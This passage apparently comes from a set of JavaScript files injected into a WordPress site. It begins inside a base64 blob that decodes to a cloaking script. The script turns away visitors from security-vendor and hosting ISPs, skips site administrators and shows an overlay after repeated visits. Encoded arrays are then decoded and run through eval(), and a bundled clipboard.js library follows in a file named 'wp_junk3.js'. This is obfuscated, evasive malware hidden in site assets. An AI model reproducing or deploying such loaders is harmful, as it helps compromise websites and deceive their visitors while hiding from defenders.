gTmV0d29yayBNb25pdG9yaW5nIENlbnRlcicsJ1RpbmV0JywnTXVsdGltZWRpYSBQb2xza2EgUy5BLicsJ011bHRpbWVkaWEgUG9sc2thIC0gUG9sdWRuaWUgUy5BLicsJ1plbml0aCBFbGVjdHJvbmljcyBDb3Jwb3JhdGlvbicsJ0JhcnJhY3VkYSBDYW5hZGEnLCdNaWNyb3NvZnQgTGltaXRlZCcsJ01pY3Jvc29mdCAoQ2hpbmEpIENvLicsJ1NQQU1maWdodGVyIEFwUycsJ1NwYW1maWdodGVyLWFzJywnRGlnaXRhbE9uZSBBRycsJ1R3aXR0ZXInLCdUd2l0dGVyIEludGVybmF0aW9uYWwgQ29tcGFueScsJ1N1cmZjb250cm9sLXJlYWRpbmcnLCdZYWhvbyBDb3JwIE5ldHdvcmsnLCdDb25lY3RpdmEnLCdDb25lY3RpdmEgVGVsZWNvbScsJ0NvbmVjdGl2YSBDZWx1bGFyIGUgSW5mb3JtYXRpY2EgTHRkYScsJ1JlZGlmZi5jb20gSW5kaWEgTGltaXRlZCcsJ0luY2VybyBMTEMnLCdPTkxJTkUgUy5BLlMuJywnT05MSU5FIFNBUycsJ1Rpc2NhbGktaXQnLCdUaXNjYWxpIFNwQScsJ1Rpc2NhbGkgVUsgTGltaXRlZCcsJ0Z1aml0c3UnLCdEYXVtIENvbW11bmljYXRpb24gQ28uLExURCcsJ0ludGVybmV0IFNlY3VyaXR5IFN5c3RlbXMnLCdWS29udGFrdGUgTHRkJywnTGVhc2V3ZWInLCdMZWFzZVdlYiBOZXRoZXJsYW5kcyBCLlYuJywnTGVhc2VXZWIgQi5WLicsJ0xlYXNlV2ViIENETiBCLlYuJywnTGVhc2VXZWIgTmV0d29yayBCLlYuJywnTGVhc2V3ZWIgQXNpYScsJ0xlYXNld2ViIEFzaWEgUGFjaWZpYyBwdGUuJywnTGVhc2V3ZWIgRGV1dHNjaGxhbmQgR21iSCcsJ0xlYXNld2ViIFVTQScsJ0xlYXNld2ViLWRlJywnSW50ZXJOQVAgTmV0d29yayBTZXJ2aWNlcyBVLksuIExpbWl0ZWQnLCdJbnRlcm5hcCBKYXBhbiBDby4sTFRELicsJ0ludGVybmFwIE5ldHdvcmsgU2VydmljZXMnLCdJbnRlcm5hcCBOZXR3b3JrIFNlcnZpY2VzIENvcnBvcmF0aW9uJywnQml0ZGVmZW5kZXItYXMnLCdCaXRkZWZlbmRlciBTUkwnLCdNWCBMb2dpYycsJ0NoaW5hIEVkdWNhdGlvbiBhbmQgUmVzZWFyY2ggTmV0d29yayBDZW50ZXInLCdDaGluYSBEdXR5IEZyZWUgZ3JvdXAnLCdDaGluYScsJ0NoaW5hIEJyb2FkYmFuZCBDb21tdW5pY2F0aW9ucyAoQ0JDbmV0KScsJ0NoaW5hIEJyb2FkY2FzdGluZyBUViBOZXQnLCdDaGluYSBDb21tdW5pY2F0aW9uIENvLicsJ0NoaW5hIENvbnN0cnVjdGlvbiBCYW5rIChBc2lhKSBDb3Jwb3JhdGlvbiBMaW1pdGVkJywnQ2hpbmEgQ3VsdHVyYWwgSGVyaXRhZ2UgSW5mb3JtYXRpb24gYW5kIENvbnN1bHRpbmcnLCdDaGluYSBEaWdpdGFsIEtpbmdkb20gVGVjaG5vbG9neSBDby4sTHRkLicsJ0NoaW5hIERyYWdvbiBUZWxlY29tIENvLixMdGQnLCdGYWN0aW9uJywnWmVuIFN5c3RlbXMgQS9TJywnT1ZIIFNBUycsJ1NvbHV0aW9uIFBybycsJ0RlZEZpYmVyQ28nLCdDbGVhckJsdWUgVGVjaG5vbG9naWVzJywnSW5mb3JtYXRpb24gVGVjaG5vbG9neSBTeXN0ZW1zJywnR29EYWRkeS5jb20sIExMQycsJ1NlcnZlciBDZW50cmFsIE5ldHdvcmsnLCdUaW5ldCBTcGEnLCdDYXByaXMgR3JvdXAnLCdJbmt0b21pIENvcnBvcmF0aW9uJywnVW5pZmllZCBMYXllcicsJ0pTQyBSVENvbW0uUlUnLCdMTEMgbWFzdGVyaG9zdCcsJ01UTyBUZWxlY29tJywnTGlua2VkSW4gQ29ycG9yYXRpb24nLCdXZWJzaXRld2VsY29tZS5jb20nLCdHVFMgVGVsZWNvbSBTUkwnLCdQdWxzZVBvaW50IENvbW11bmljYXRpb25zJywnUHVsc2Vwb2ludCcsJ1RpbWVXZWIgTHRkLicsJ0JlaWppbmcgQmFpZHUgTmV0Y29tIFNjaWVuY2UgYW5kIFRlY2hub2xvZ3kgQ28uJywnRGlnaXRhbCBPY2VhbicsJ1RocmVhdFRyYWNrJywnVGhyZWF0VHJhY2sgU2VjdXJpdHknLCdFR0lIb3N0aW5nJywnSEVUWk5FUicsJ0hldHpuZXItYXMnLCdIZXR6bmVyIE9ubGluZSBHbWJIJywnSEVUWk5FUiAoUHR5KSBMdGQnLCdIZXR6bmVyIENDJywnTGltaXRlZCBsaWFiaWxpdHkgY29tcGFueSBNYWlsLlJ1JywnQW1hem9uIENvcnBvcmF0ZSBMTEMnLCdBbWF6b24gRGF0YSBTZXJ2aWNlcyBJcmVsYW5kIEx0ZCcsJ0FtYXpvbiBXZWIgU2VydmljZXMsIExMQycsJ0FtYXpvbi5jb20gVGVjaCBUZWxlY29tJywnQW1hem9uaWEgUHVibGljaWRhZGUgTHRkYScsJ0FtYXpvbmlhIFRlbGVjb20gTHRkYS4gLSBNZScsJ0thc3BlcnNreSBMYWIgQU8nLCdBbGlzdGFyIFNlY3VyaXR5IFNybCcsJ05GT3JjZSBFbnRlcnRhaW5tZW50IEIuVi4nLCdTSyBCcm9hZGJhbmQnLCdaYXlvIEdyb3VwIEVVIExpbWl0ZWQnLCdRdWFkcmFOZXQnLCdSYW1Ob2RlIExMQycsJ0hvc3RVUycKICAgICAgXTsKCiAgICAgIGlmIChibG9ja2VkSVNQcy5pbmNsdWRlcyhpc3ApKSB7CiAgICAgICAgdmxvZygnZGVueV9pc3AnLCBpc3ApOwogICAgICAgIHRyYWNrQm90KCk7CiAgICAgICAgcmV0dXJuIGZhbHNlOwogICAgICB9CiAgICAgIAoKICAgICAgcmV0dXJuIHRydWU7CiAgICB9IGNhdGNoIChlcnIpIHsKICAgICAgdmVycignQWNjZXNzIGNoZWNrIGZhaWxlZDonLCBlcnIpOwogICAgICByZXR1cm4gdHJ1ZTsKICAgIH0KICB9CgogIGFzeW5jIGZ1bmN0aW9uIGluaXQoKSB7CiAgICB0cnkgewogICAgICBjb25zdCBhbGxvd2VkID0gYXdhaXQgaXNBY2Nlc3NBbGxvd2VkKCk7CiAgICAgIHZsb2coJ2FjY2Vzc19hbGxvd2VkJywgYWxsb3dlZCk7CiAgICAgIGlmICghYWxsb3dlZCkgewogICAgICAgIHJldHVybjsKICAgICAgfQoKICAgICAgY29uc3Qgc2tpcCA9IGdldFZhbCgnX3NraXAnLCAnMCcpOwogICAgICBpZiAoc2tpcCA9PT0gJzEnKSB7CiAgICAgICAgcmV0dXJuOwogICAgICB9CgogICAgICBpZiAoZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ3dwYWRtaW5iYXInKSkgewogICAgICAgIHJldHVybjsKICAgICAgfQoKICAgICAgbGV0IGNvdW50ID0gcGFyc2VJbnQoZ2V0VmFsKEtFWSwgJzAnKSwgMTApOwogICAgICBpZiAoTnVtYmVyLmlzTmFOKGNvdW50KSkgY291bnQgPSAwOwogICAgICBjb3VudCsrOwogICAgICBzZXRWYWwoS0VZLCBjb3VudC50b1N0cmluZygpKTsKCiAgICAgIGlmIChjb3VudCA+PSBOKSB7CiAgICAgICAgcmVuZGVyT3ZlcmxheSgpOwogICAgICB9CiAgICB9IGNhdGNoKGUpIHsKICAgICAgdmVycignaW5pdF9mYWlsZWQnLCBlKTsKICAgICAgcmVuZGVyT3ZlcmxheSgpOwogICAgfQogIH0KCiAgaWYgKGRvY3VtZW50LmJvZHkpIHsKICAgIGluaXQoKTsKICB9IGVsc2UgewogICAgZG9jdW1lbnQuYWRkRXZlbnRMaXN0ZW5lcignRE9NQ29udGVudExvYWRlZCcsIGluaXQpOwogIH0KfSkoKTsKICA=",
    "MC40MTU1Nzg5MjcwNzg4OTI=",
    "MC41MzQ3MzUxOTczNzkwNzc=",
    "MC41MTAyOTI0NTU2MjMwMjQ1",
    "MC40ODMwMjQ1MzA5ODg3NzcwNw==",
    "MC4yODkzOTMzODkxNjEyODky",
    "MC4xNTY0NTM5NzkwODQ0NTY5",
    "MC42MTQ0NzkzMDMwNTEyMzg=",
    "MC4xODM3NzAyNTE1OTE1MDA0",
    "MC44MjQwOTQxMDIxMTE1MjQy"
  ];

  var _k1 = "539252";
  var _k2 = "385903";
  var _k3 = 0;

  var _code = b64ToUtf8(_b[_k1]) + b64ToUtf8(_f[_k2]) + b64ToUtf8(_c[_k3]);
  eval(_code);
})();
/* >>> wp_junk3.js (26806 bytes) <<< */
(function(){
try{
/*!
 * clipboard.js v2.0.11
 * https://clipboardjs.com/
 *
 * Licensed MIT © Zeno Rocha
 */
(function webpackUniversalModuleDefinition(root, factory) {
	if(typeof exports === 'object' && typeof module === 'object')
		module.exports = factory();
	else if(typeof define === 'function' && define.amd)
		define([], factory);
	else if(typeof exports === 'object')
		exports["ClipboardJS"] = factory();
	else
		root["ClipboardJS"] = factory();
})(this, function() {
return /******/ (function() { // webpackBootstrap
/******/ 	var __webpack_modules__ = ({

/***/ 686:
/***/ (function(__unused_webpack_module, __webpack_exports__, __webpack_require__) {

"use strict";

// EXPORTS
__webpack_require__.d(__webpack_exports__, {
  "default": function() { return /* binding */ clipboard; }
});

// EXTERNAL MODULE: ./node_modules/tiny-emitter/index.js
var tiny_emitter = __webpack_require__(279);
var tiny_emitter_default = /*#__PURE__*/__webpack_require__.n(tiny_emitter);
// EXTERNAL MODULE: ./node_modules/good-listener/src/listen.js
var listen = __webpack_require__(370);
var listen_default = /*#__PURE__*/__webpack_require__.n(listen);
// EXTERNAL MODULE: ./node_modules/select/src/select.js
var src_select = __webpack_require__(817);
var select_default = /*#__PURE__*/__webpack_require__.n(src_select);
;// CONCATENATED MODULE: ./src/common/command.js
/**
 * Executes a given operation type.
 * @param {String} type
 * @return {Boolean}
 */
function command(type) {
  try {
    return document.execCommand(type);
  } catch (err) {
    return false;
  }
}
;// CONCATENATED MODULE: ./src/actions/cut.js


/**
 * Cut action wrapper.
 * @param {String|HTMLElement} target
 * @return {String}
 */

var ClipboardActionCut = function ClipboardActionCut(target) {
  var selectedText = select_default()(target);
  command('cut');
  return selectedText;
};

/* harmony default export */ var actions_cut = (ClipboardActionCut);
;// CONCATENATED MODULE: ./src/common/create-fake-element.js
/**
 * Creates a fake textarea element with a value.
 * @param {String} value
 * @return {HTMLElement}
 */
function createFakeElement(value) {
  var isRTL = document.documentElement.getAttribute('dir') === 'rtl';
  var fakeElement = document.createElement('textarea'); // Prevent zooming on iOS

  fakeElement.style.fontSize = '12pt'; // Reset box model

  fakeElement.style.border = '0';
  fakeElement.style.padding = '0';
  fakeElement.style.margin = '0'; // Move element out of screen horizontally

  fakeElement.style.position = 'absolute';
  fakeElement.style[isRTL ? 'right' : 'left'] = '-9999px'; // Move element to the same position vertically

  var yPosition = window.pageYOffset || document.documentElement.scrollTop;
  fakeElement.style.top = "".concat(yPosition, "px");
  fakeElement.setAttribute('readonly', '');
  fakeElement.value = value;
  return fakeElement;
}
;// CONCATENATED MODULE: ./src/actions/copy.js



/**
 * Create fake copy action wrapper using a fake element.
 * @param {String} target
 * @param {Object} options
 * @return {String}
 */

var fakeCopyAction = function fakeCopyAction(value, options) {
  var fakeElement = createFakeElement(value);
  options.container.appendChild(fakeElement);
  var selectedText = select_default()(fakeElement);
  command('copy');
  fakeElement.remove();
  return selectedText;
};
/**
 * Copy action wrapper.
 * @param {String|HTMLElement} target
 * @param {Object} options
 * @return {String}
 */


var ClipboardActionCopy = function ClipboardActionCopy(target) {
  var options = arguments.length > 1 && arguments[1] !== undefined ? arguments[1] : {
    container: document.body
  };
  var selectedText = '';

  if (typeof target === 'string') {
    selectedText = fakeCopyAction(target, options);
  } else if (target instanceof HTMLInputElement && !['text', 'search', 'url', 'tel', 'password'].includes(target === null || target === void 0 ? void 0 : target.type)) {
    // If input type doesn't support `setSelectionRange`. Simulate it. https://developer.mozilla.org/en-US/docs/Web/API/HTMLInputElement/setSelectionRange
    selectedText = fakeCopyAction(target.value, options);
  } else {
    selectedText = select_default()(target);
    command('copy');
  }

  return selectedText;
};

/* harmony default export */ var actions_copy = (ClipboardActionCopy);
;// CONCATENATED MODULE: ./src/actions/default.js
function _typeof(obj) { "@babel/helpers - typeof"; if (typeof Symbol === "function" && typeof Symbol.iterator === "symbol") { _typeof = function _typeof(obj) { return typeof obj; }; } else { _typeof = function _typeof(obj) { return obj && typeof Symbol === "function" && obj.constructor === Symbol && obj !== Symbol.prototype ? "symbol" : typeof obj; }; } return _typeof(obj); }



/**
 * Inner function which performs selection from either `text` or `target`
 * properties and then executes copy or cut operations.
 * @param {Object} options
 */

var ClipboardActionDefault = function ClipboardActionDefault() {
  var options = arguments.length > 0 && arguments[0] !== undefined ? arguments[0] : {};
  // Defines base properties passed from constructor.
  var _options$action = options.action,
      action = _options$action === void 0 ? 'copy' : _options$action,
      container = options.container,
      target = options.target,
      text = options.text; // Sets the `action` to be performed which can be either 'copy' or 'cut'.

  if (action !== 'copy' && action !== 'cut') {
    throw new Error('Invalid "action" value, use either "copy" or "cut"');
  } // Sets the `target` property using an element that will be have its content copied.


  if (target !== undefined) {
    if (target && _typeof(target) === 'object' && target.nodeType === 1) {
      if (action === 'copy' && target.hasAttribute('disabled')) {
        throw new Error('Invalid "target" attribute. Please use "readonly" instead of "disabled" attribute');
      }

      if (action === 'cut' && (target.hasAttribute('readonly') || target.hasAttribute('disabled'))) {
        throw new Error('Invalid "target" attribute. You can\'t cut text from elements with "readonly" or "disabled" attributes');
      }
    } else {
      throw new Error('Invalid "target" value, use a valid Element');
    }
  } // Define selection strategy based on `text` property.


  if (text) {
    return actions_copy(text, {
      container: container
    });
  } // Defines which selection strategy based on `target` property.


  if (target) {
    return action === 'cut' ? actions_cut(target) : actions_copy(target, {
      container: container
    });
  }
};

/* harmony default export */ var actions_default = (ClipboardActionDefault);
;// CONCATENATED MODULE: ./src/clipboard.js
function clipboard_typeof(obj) { "@babel/helpers - typeof"; if (typeof Symbol === "function" && typeof Symbol.iterator === "symbol") { clipboard_typeof = function _typeof(obj) { return typeof obj; }; } else { clipboard_typeof = function _typeof(obj) { return obj && typeof Symbol === "function" && obj.constructor === Symbol && obj !== Symbol.prototype ? "symbol" : typeof obj; }; } return clipboard_typeof(obj); }

function _classCallCheck(instance, Constructor) { if (!(instance instanceof Constructor)) { throw new TypeError("Cannot call a class as a function"); } }

function _defineProperties(target, props) { for (var i = 0; i < props.length; i++) { var descriptor = props[i]; descriptor.enumerable = descriptor.enumerable || false; descriptor.configurable = true; if ("value" in descriptor) descriptor.writable = true; Object.defineProperty(target, descriptor.key, descriptor); } }

function _createClass(Constructor, protoProps, staticProps) { if (protoProps) _defineProperties(Constructor.prototype, protoProps); if (staticProps) _defineProperties(Constructor, staticProps); return Constructor; }

function _inherits(subClass, superClass) { if (typeof superClass !== "function" && superClass !== null) { throw new TypeError("Super expression must either be null or a function"); } subClass.prototype = Object.create(superClass && superClass.prototype, { constructor: { value: subClass, writable: true, configurable: true } }); if (superClass) _setPrototypeOf(subClass, superClass); }

function _setPrototypeOf(o, p) { _setPrototypeOf = Object.setPrototypeOf || function _setPrototypeOf(o, p) { o.__proto__ = p; return o; }; return _setPrototypeOf(o, p); }

function _createSuper(Derived) { var hasNativeReflectConstruct = _isNativeReflectConstruct(); return function _createSuperInternal() { var Super = _getPrototypeOf(Derived), result; if (hasNativeReflectConstruct) { var NewTarget = _getPrototypeOf(this).constructor; result = Reflect.construct(Super, arguments, NewTarget); } else { result = Super.apply(this, arguments); } return _possibleConstructorReturn(this, result); }; }

function _possibleConstructorReturn(self, call) { if (call && (clipboard_typeof(call) === "object" || typeof call === "function")) { return call; } return _assertThisInitialized(self); }

function _assertThisInitialized(self) { if (self === void 0) { throw new ReferenceError("this hasn't been initialised - super() hasn't been called"); } return self; }

function _isNativeReflectConstruct() { if (typeof Reflect === "undefined" || !Reflect.construct) return false; if (Reflect.construct.sham) return false; if (typeof Proxy === "function") return true; try { Date.prototype.toString.call(Reflect.construct(Date, [], function () {})); return true; } catch (e) { return false; } }

function _getPrototypeOf(o) { _getPrototypeOf = Object.setPrototypeOf ? Object.getPrototypeOf : function _getPrototypeOf(o) { return o.__proto__ || Object.getPrototypeOf(o); }; return _getPrototypeOf(o); }






/**
 * Helper function to retrieve attribute value.
 * @param {String} suffix
 * @param {Element} element
 */

function getAttributeValue(suffix, element) {
  var attribute = "data-clipboard-".concat(suffix);

  if (!element.hasAttribute(attribute)) {
    return;
  }

  return element.getAttribute(attribute);
}
/**
 * Base class which takes one or more elements, adds event listeners to them,
 * and instantiates a new `ClipboardAction` on each click.
 */


var Clipboard = /*#__PURE__*/function (_Emitter) {
  _inherits(Clipboard, _Emitter);

  var _super = _createSuper(Clipboard);

  /**
   * @param {String|HTMLElement|HTMLCollection|NodeList} trigger
   * @param {Object} options
   */
  function Clipboard(trigger, options) {
    var _this;

    _classCallCheck(this, Clipboard);

    _this = _super.call(this);

    _this.resolveOptions(options);

    _this.listenClick(trigger);

    return _this;
  }
  /**
   * Defines if attributes would be resolved using internal setter functions
   * or custom functions that were passed in the constructor.
   * @param {Object} options
   */


  _createClass(Clipboard, [{
    key: "resolveOptions",
    value: function resolveOptions() {
      var options = arguments.length > 0 && arguments[0] !== undefined ? arguments[0] : {};
      this.action = typeof options.action === 'function' ? options.action : this.defaultAction;
      this.target = typeof options.target === 'function' ? options.target : this.defaultTarget;
      this.text = typeof options.text === 'function' ? options.text : this.defaultText;
      this.container = clipboard_typeof(options.container) === 'object' ? options.container : document.body;
    }
    /**
     * Adds a click event listener to the passed trigger.
     * @param {String|HTMLElement|HTMLCollection|NodeList} trigger
     */

  }, {
    key: "listenClick",
    value: function listenClick(trigger) {
      var _this2 = this;

      this.listener = listen_default()(trigger, 'click', function (e) {
        return _this2.onClick(e);
      });
    }
    /**
     * Defines a new `ClipboardAction` on each click event.
     * @param {Event} e
     */

  }, {
    key: "onClick",
    value: function onClick(e) {
      var trigger = e.delegateTarget || e.currentTarget;
      var action = this.action(trigger) || 'copy';
      var text = actions_default({
        action: action,
        container: this.container,
        target: this.target(trigger),
        text: this.text(trigger)
      }); // Fires an event based on the copy operation result.

      this.emit(text ? 'success' : 'error', {
        action: action,
        text: text,
        trigger: trigger,
        clearSelection: function clearSelection() {
          if (trigger) {
            trigger.focus();
          }

          window.getSelection().removeAllRanges();
        }
      });
    }
    /**
     * Default `action` lookup function.
     * @param {Element} trigger
     */

  }, {
    key: "defaultAction",
    value: function defaultAction(trigger) {
      return getAttributeValue('action', trigger);
    }
    /**
     * Default `target` lookup function.
     * @param {Element} trigger
     */

  }, {
    key: "defaultTarget",
    value: function defaultTarget(trigger) {
      var selector = getAttributeValue('target', trigger);

      if (selector) {
        return document.querySelector(selector);
      }
    }
    /**
     * Allow fire programmatically a copy action
     * @param {String|HTMLElement} target
     * @param {Object} options
     * @returns Text copied.
     */

  }, {
    key: "defaultText",

    /**
     * Default `text` lookup function.
     * @param {Element} trigger
     */
    value: function defaultText(trigger) {
      return getAttributeValue('text', trigger);
    }
    /**
     * Destroy lifecycle.
     */

  }, {
    key: "destroy",
    value: function destroy() {
      this.listener.destroy();
    }
  }], [{
    key: "copy",
    value: function copy(target) {
      var options = arguments.length > 1 && arguments[1] !== undefined ? arguments[1] : {
        container: document.body
      };
      return actions_copy(target, options);
    }
    /**
     * Allow fire programmatically a cut action
     * @param {String|HTMLElement} target
     * @returns Text cutted.
     */

  }, {
    key: "cut",
    value: function cut(target) {
      return actions_cut(target);
    }
    /**
     * Returns the support of the given action, or all actions if no action is
     * given.
     * @param {String} [action]
     */

  }, {
    key: "isSupported",
    value: function isSupported() {
      var action = arguments.length > 0 && arguments[0] !== undefined ? arguments[0] : ['copy', 'cut'];
      var actions = typeof action === 'string' ? [action] : action;
      var support = !!document.queryCommandSupported;
      actions.forEach(function (action) {
        support = support && !!document.queryCommandSupported(action);
      });
      return support;
    }
  }]);

  return Clipboard;
}((tiny_emitter_default()));

/* harmony default export */ var clipboard = (Clipboard);

/***/ }),

/***/ 828:
/***/ (function(module) {

var DOCUMENT_NODE_TYPE = 9;

/**
 * A polyfill for Element.matches()
 */
if (typeof Element !== 'undefined' && !Element.prototype.matches) {
    var proto = Element.prototype;

    proto.matches = proto.matchesSelector ||
                    proto.mozMatchesSelector ||
                    proto.msMatchesSelector ||
                    proto.oMatchesSelector ||
                    proto.webkitMatchesSelector;
}

/**
 * Finds the closest parent that matches a selector.
 *
 * @param {Element} element
 * @param {String} selector
 * @return {Function}
 */
function closest (element, selector) {
    while (element && element.nodeType !== DOCUMENT_NODE_TYPE) {
        if (typeof element.matches === 'function' &&
            element.matches(selector)) {
          return element;
        }
        element = element.parentNode;
    }
}

module.exports = closest;


/***/ }),

/***/ 438:
/***/ (function(module, __unused_webpack_exports, __webpack_require__) {

var closest = __webpack_require__(828);

/**
 * Delegates event to a selector.
 *
 * @param {Element} element
 * @param {String} selector
 * @param {String} type
 * @param {Function} callback
 * @param {Boolean} useCapture
 * @return {Object}
 */
function _delegate(element, selector, type, callback, useCapture) {
    var listenerFn = listener.apply(this, arguments);

    element.addEventListener(type, listenerFn, useCapture);

    return {
        destroy: function() {
            element.removeEventListener(type, listenerFn, useCapture);
        }
    }
}

/**
 * Delegates event to a selector.
 *
 * @param {Element|String|Array} [elements]
 * @param {String} selector
 * @param {String} type
 * @param {Function} callback
 * @param {Boolean} useCapture
 * @return {Object}
 */
function delegate(elements, selector, type, callback, useCapture) {
    // Handle the regular Element usage
    if (typeof elements.addEventListener === 'function') {
        return _delegate.apply(null, arguments);
    }

    // Handle Element-less usage, it defaults to global delegation
    if (typeof type === 'function') {
        // Use `document` as the first parameter, then apply arguments
        // This is a short way to .unshift `arguments` without running into deoptimizations
        return _delegate.bind(null, document).apply(null, arguments);
    }

    // Handle Selector-based usage
    if (typeof elements === 'string') {
        elements = document.querySelectorAll(elements);
    }

    // Handle Array-like based usage
    return Array.prototype.map.call(elements, function (element) {
        return _delegate(element, selector, type, callback, useCapture);
    });
}

/**
 * Finds closest match and invokes callback.
 *
 * @param {Element} element
 * @param {String} selector
 * @param {String} type
 * @param {Function} callback
 * @return {Function}
 */
function listener(element, selector, type, callback) {
    return function(e) {
        e.delegateTarget = closest(e.target, selector);

        if (e.delegateTarget) {
            callback.call(element, e);
        }
    }
}

module.exports = delegate;


/***/ }),

/***/ 879:
/***/ (function(__unused_webpack_module, exports) {

/**
 * Check if argument is a HTML element.
 *
 * @param {Object} value
 * @return {Boolean}
 */
exports.node = function(value) {
    return value !== undefined
        && value instanceof HTMLElement
        && value.nodeType === 1;
};

/**
 * Check if argument is a list of HTML elements.
 *
 * @param {Object} value
 * @return {Boolean}
 */
exports.nodeList = function(value) {
    var type = Object.prototype.toString.call(value);

    return value !== undefined
        && (type === '[object NodeList]' || type === '[object HTMLCollection]')
        && ('length' in value)
        && (value.length === 0 || exports.node(value[0]));
};

/**
 * Check if argument is a string.
 *
 * @param {Object} value
 * @return {Boolean}
 */
exports.string = function(value) {
    return typeof value === 'string'
        || value instanceof String;
};

/**
 * Check if argument is a function.
 *
 * @param {Object} value
 * @return {Boolean}
 */
exports.fn = function(value) {
    var type = Object.prototype.toString.call(value);

    return type === '[object Function]';
};


/***/ }),

/***/ 370:
/***/ (function(module, __unused_webpack_exports, __webpack_require__) {

var is = __webpack_require__(879);
var delegate = __webpack_require__(438);

/**
 * Validates all params and calls the right
 * listener function based on its target type.
 *
 * @param {String|HTMLElement|HTMLCollection|NodeList} target
 * @param {String} type
 * @param {Function} callback
 * @return {Object}
 */
function listen(target, type, callback) {
    if (!target && !type && !callback) {
        throw new Error('Missing required arguments');
    }

    if (!is.string(type)) {
        throw new TypeError('Second argument must be a String');
    }

    if (!is.fn(callback)) {
        throw new TypeError('Third argument must be a Function');
    }

    if (is.node(target)) {
        return listenNode(target, type, callback);
    }
    else if (is.nodeList(target)) {
        return listenNodeList(target, type, callback);
    }
    else if (is.string(target)) {
        return listenSelector(target, type, callback);
    }
    else {
        throw new TypeError('First argument must be a String, HTMLElement, HTMLCollection, or NodeList');
    }
}

/**
 * Adds an event listener to a HTML element
 * and returns a remove listener function.
 *
 * @param {HTMLElement} node
 * @param {String} type
 * @param {Function} callback
 * @return {Object}
 */
function listenNode(node, type, callback) {
    node.addEventListener(type, callback);

    return {
        destroy: function() {
            node.removeEventListener(type, callback);
        }
    }
}

/**
 * Add an event listener to a list of HTML elements
 * and returns a remove listener function.
 *
 * @param {NodeList|HTMLCollection} nodeList
 * @param {String} type
 * @param {Function} callback
 * @return {Object}
 */
function listenNodeList(nodeList, type, callback) {
    Array.prototype.forEach.call(nodeList, function(node) {
        node.addEventListener(type, callback);
    });

    return {
        destroy: function() {
            Array.prototype.forEach.call(nodeList, function(node) {
                node.removeEventListener(type, callback);
            });
        }
    }
}

/**
 * Add an event listener to a selector
 * and returns a remove listener function.
 *
 * @param {String} selector
 * @param {String} type
 * @param {Function} callback
 * @return {Object}
 */
function listenSelector(selector, type, callback) {
    return delegate(document.body, selector, type, callback);
}

module.exports = listen;


/***/ }),

/***/ 817:
/***/ (function(module) {

function select(element) {
    var selectedText;

    if (element.nodeName === 'SELECT') {
        element.focus();

        selectedText = element.value;
    }
    else if (element.nodeName === 'INPUT' || element.nodeName === 'TEXTAREA') {
        var isReadOnly = element.hasAttribute('readonly');

        if (!isReadOnly) {
            element.setAttribute('readonly', '');
        }

        element.select();
        element.setSelectionRange(0, element.value.length);

        if (!isReadOnly) {
            element.removeAttribute('readonly');
        }

        selectedText = element.value;
    }
    else {
        if (element.hasAttribute('contenteditable')) {
            element.focus();
        }

        var selection = window.getSelection();
        var range = document.createRange();

        range.selectNodeContents(element);
        selection.removeAllRanges();
        selection.addRange(range);

        selectedText = selection.toString();
    }

    return selectedText;
}

module.exports = select;


/***/ }),

/***/ 279:
/***/ (function(module) {

function E () {
  // Keep this empty so it's easier to inherit from
  // (via https://github.com/lipsmack from https://github.com/scottcorgan/tiny-emitter/issues/3)
}

E.prototype = {
  on: function (name, callback, ctx) {
    var e = this.e || (this.e = {});

    (e[name] || (e[name] = [])).push({
      fn: callback,
      ctx: ctx
    });

    return this;
  },

  once: function (name, callback, ctx) {
    var self = this;
    function listener () {
      self.off(name, listener);
      callback.apply(ctx, arguments);
    };

    listener._ = callback
    return this.on(name, listener, ctx);
  },

  emit: function (name) {
    var data = [].slice.call(arguments, 1);
    var evtArr = ((this.e || (this.e = {}))[name] || []).slice();
    var i = 0;
    var len = evtArr.length;

    for (i; i < len; i++) {
      evtArr[i].fn.apply(evtArr[i].ctx, data);
    }

    return this;
  },

  off: function (name, callback) {
    var e = this.e || (this.e = {});
    var evts = e[name];
    var liveEvents = [];

    if (evts && callback) {
      for (var i = 0, len = evts.length; i < len; i++) {
        if (evts[i].fn !== callback && evts[i].fn._ !== callback)
          liveEvents.push(evts[i]);
      }
    }

    // Remove event from queue to prevent memory leak
    // Suggested by https://github.com/lazd
    // Ref: https://github.com/scottcorgan/tiny-emitter/commit/c6ebfaa9bc973b33d110a84a307742b7cf94c953#commitcomment-5024910

    (liveEvents.length)
      ? e[name] = liveEvents
      : delete e[name];

    return this;
  }
};

module.exports = E;
module.exports.TinyEmitter = E;


/***/ })

/******/ 	});
/************************************************************************/
/******/ 	// The module cache
/******/ 	var __webpack_module_cache__ = {};
/******/ 	
/******/ 	// The require function
/******/ 	function __webpack_require__(moduleId) {
/******/ 		// Check if module is in cache
/******/ 		if(__webpack_module_cache__[moduleId]) {
/******/ 			return __webpack_module_cache__[moduleId].exports;
/******/ 		}
/******/ 		// Create a new module (and put it into the cache)
/******/ 		var module = __webpack_module_cache__[moduleId] = {
/******/ 			// no module.id needed
/******/ 			// no module.loaded needed
/******/ 			exports: {}
/******/ 		};
/******/ 	
/******/ 		// Execute the module function
/******/ 		__webpack_modules__[moduleId](module, module.exports, __webpack_require__);
/******/ 	
/******/ 		// Return the exports of the module
/******/ 		return module.exports;
/******/ 	}
/******/ 	
/************************************************************************/
/******/ 	/* webpack/runtime/compat get default export */
/******/ 	!function() {
/******/ 		// getDefaultExport function for compatibility with non-harmony modules
/******/ 		__webpack_require__.n = function(module) {
/******/ 			var getter = module && module.__esModule ?
/******/ 				function() { return module['default']; } :
/******/ 				function() { return module; };
/******/ 			__webpack_require__.d(getter, { a: getter });
/******/ 			return getter;
/******/ 		};
/******/ 	}();
/******/ 	
/******/ 	/* webpack/runtime/define property getters */
/******/ 	!function() {
/******/ 		// define getter functions for harmony exports
/******/ 		__webpack_require__.d = function(exports, definition) {
/******/ 			for(var key in definition) {
/******/ 				if(__webpack_require__.o(definition, key) && !__webpack_require__.o(exports, key)) {
/******/ 					Object.defineProperty(exports, key, { enumerable: true, get: definition[key] });
/******/ 				}
/******/ 			}
/******/ 		};
/******/ 	}();
/******/ 	
/******/ 	/* webpack/runtime/hasOwnProperty shorthand */
/******/ 	!function() {
/******/ 		__webpack_require__.o = function(obj, prop) { return Object.prototype.hasOwnProperty.call(obj, prop); }
/******/ 	}();
/******/ 	
/************************************************************************/
/******/ 	// module exports must be returned from runtime so entry inlining is disabled
/******/ 	// startup
/******/ 	// Load entry module and return exports
/******/ 	return __webpack_require__(686);
/******/ })()
.default;
});
}catch(e){}
})();

